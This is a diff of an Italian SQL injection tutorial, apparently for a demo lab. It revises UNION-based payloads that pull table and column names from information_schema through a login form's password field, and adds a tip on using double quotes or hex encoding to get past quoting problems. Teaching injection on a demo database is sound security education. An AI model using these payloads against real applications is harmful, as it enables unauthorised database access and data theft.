@@ -169,7 +169,7 @@ Possiamo addirittura scoprire la password degli utenti direttamente dalla rispos
 
 Nel primo esempio abbiamo visto come forzare l'accesso. Ma affinché gli attacchi più avanzati funzionino, bisogna conoscere la struttura del database: nomi di tabelle e colonne.
 
-MySQL espone queste informazioni tramite il database di sistema `information_schema`. Inserendo i seguenti payload nel campo **password** dell'Esempio 1, possiamo estrarle una alla volta:
+MariaDB espone queste informazioni tramite il database di sistema `information_schema`. Inserendo i seguenti payload nel campo **password** dell'Esempio 1, possiamo estrarle una alla volta:
 
 **1. Nome del database:**
 ```
@@ -178,12 +178,17 @@ MySQL espone queste informazioni tramite il database di sistema `information_sch
 
 **2. Nomi delle tabelle:**
 ```
-' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'my_db' LIMIT 0,1; -- x
+' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = "sql_injection_demo" LIMIT 0,1; -- x
 ```
+
+> ⚠️ **Attenzione agli apici annidati:** il payload viene inserito dentro una stringa già delimitata da apici singoli (`'`). Usare altri apici singoli dentro il valore di `TABLE_SCHEMA` romperebbe la sintassi SQL. Si usano invece le **virgolette doppie** (`"`), accettate da MariaDB come delimitatori alternativi, oppure la **codifica esadecimale** del nome del database (che non richiede alcun delimitatore):
+> ```
+> ' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 0x73716c5f696e6a656374696f6e5f64656d6f LIMIT 0,1; -- x
+> ```
 
 **3. Nomi delle colonne di una tabella:**
 ```
-' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'my_db' AND TABLE_NAME = 'users_ex1' LIMIT 3,1; -- x
+' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = "sql_injection_demo" AND TABLE_NAME = "users_ex1" LIMIT 3,1; -- x
 ```
 
 > 💡 Cambiando il valore di `LIMIT` (es. `LIMIT 0,1`, `LIMIT 1,1`, `LIMIT 2,1`...) si scorrono tutti i risultati uno alla volta, permettendo di mappare l'intera struttura del database con pazienza.
